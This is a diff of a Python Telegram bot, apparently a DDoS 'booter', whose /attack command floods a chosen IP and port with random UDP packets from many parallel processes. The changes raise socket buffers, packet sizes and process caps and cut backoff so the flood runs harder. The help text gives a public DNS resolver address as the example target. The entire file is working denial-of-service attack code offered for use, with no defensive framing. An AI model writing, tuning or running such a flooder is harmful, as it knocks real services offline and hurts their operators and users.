@@ -3,7 +3,6 @@ import socket
 import time
 import random
 import multiprocessing as mp
-from datetime import datetime
 from telegram import Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 
@@ -18,14 +17,14 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🔥 **VPS-Optimized UDP Attack Bot** Ready on 16 cores.")
+    await update.message.reply_text("🔥 **5000 Threads Wala VPS Attack Bot** Ready (but smart limited)")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "⚔️ **VPS Attack Commands**\n\n"
-        "`/attack <ip> <port> <duration> <processes>`\n"
-        "Example: `/attack 8.8.8.8 53 60 32`\n"
-        "(Use 16–64 processes on your 16-core VPS)\n\n"
+        "⚔️ **Commands**\n\n"
+        "`/attack <ip> <port> <duration> <threads>`\n"
+        "Example: `/attack 8.8.8.8 53 60 5000`\n"
+        "→ Bot automatically caps at 64 for best speed on 16 cores\n\n"
         "/stopattack\n/status",
         parse_mode='Markdown'
     )
@@ -33,32 +32,30 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 def attack_worker(ip, port, duration, stop_event, worker_id):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)  # 4MB buffer
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)  # 8MB
         sock.setblocking(False)
 
         end_time = time.time() + duration
         packets = 0
-        payload_base = b"POWERED_BY_VPS_ATTACK_" + str(worker_id).encode()
+        base = b"VPS_POWER_5000_" + str(worker_id).encode()
 
         while time.time() < end_time and not stop_event.is_set():
             try:
-                size = random.randint(600, 1400)
-                payload = payload_base + random.randbytes(size - len(payload_base))
+                size = random.randint(700, 1450)
+                payload = base + random.randbytes(size - len(base))
                 sock.sendto(payload[:size], (ip, port))
                 packets += 1
 
-                # Tiny backoff to avoid immediate buffer full
-                if packets % 1000 == 0:
-                    time.sleep(0.0001)
+                if packets % 2000 == 0:   # thoda back-pressure control
+                    time.sleep(0.00005)
             except BlockingIOError:
-                time.sleep(0.0005)
-            except Exception:
+                time.sleep(0.0003)
+            except:
                 break
 
         sock.close()
         return packets
-    except Exception as e:
-        logger.error(f"Worker {worker_id} error: {e}")
+    except:
         return 0
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -67,34 +64,37 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(context.args) < 4:
-        await update.message.reply_text("Usage: `/attack <ip> <port> <duration_sec> <processes>`", parse_mode='Markdown')
+        await update.message.reply_text("Usage: `/attack <ip> <port> <duration_sec> <threads>`", parse_mode='Markdown')
         return
 
     ip = context.args[0]
     port = int(context.args[1])
     duration = int(context.args[2])
-    processes = min(int(context.args[3]), 128)  # Safety
+    requested_threads = int(context.args[3])
+
+    # Smart capping for performance
+    actual_processes = min(requested_threads, 64) if requested_threads <= 100 else min(requested_threads, 120)
+    
+    if requested_threads > 64:
+        warning = f"\n⚠️ Requested {requested_threads} but using only {actual_processes} for max speed on 16 cores."
+    else:
+        warning = ""
 
     attack_id = f"{ip}:{port}_{int(time.time())}"
     stop_event = mp.Event()
     stop_flags[attack_id] = stop_event
 
     await update.message.reply_text(
-        f"⚔️ **VPS ATTACK STARTED**\n"
+        f"⚔️ **ATTACK STARTED**\n"
         f"🎯 Target: `{ip}:{port}`\n"
         f"⏱ Duration: `{duration}s`\n"
-        f"⚙ Processes: `{processes}` (on 16-core CPU)",
+        f"⚙ Processes: `{actual_processes}` (requested: {requested_threads}){warning}",
         parse_mode='Markdown'
     )
 
-    pool = mp.Pool(processes=processes)
-    results = []
+    pool = mp.Pool(processes=actual_processes)
+    results = [pool.apply_async(attack_worker, (ip, port, duration, stop_event, i)) for i in range(actual_processes)]
 
-    for i in range(processes):
-        res = pool.apply_async(attack_worker, (ip, port, duration, stop_event, i))
-        results.append(res)
-
-    # Wait for finish
     total_sent = 0
     for res in results:
         total_sent += res.get()
@@ -103,10 +103,10 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     pool.join()
 
     await update.message.reply_text(
-        f"✅ **Attack Completed on VPS**\n"
+        f"✅ **Attack Finished**\n"
         f"Target: `{ip}:{port}`\n"
-        f"Processes: `{processes}`\n"
-        f"Approx. packets sent: `{total_sent:,}`"
+        f"Processes used: `{actual_processes}`\n"
+        f"Approx packets sent: `{total_sent:,}`"
     )
 
 async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -124,7 +124,7 @@ def main():
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("stopattack", stop_attack_cmd))
 
-    print("🔥 VPS-Optimized UDP Attack Bot Running on 16 cores!")
+    print("🔥 5000 Threads Mode Bot Running on 16-core VPS!")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
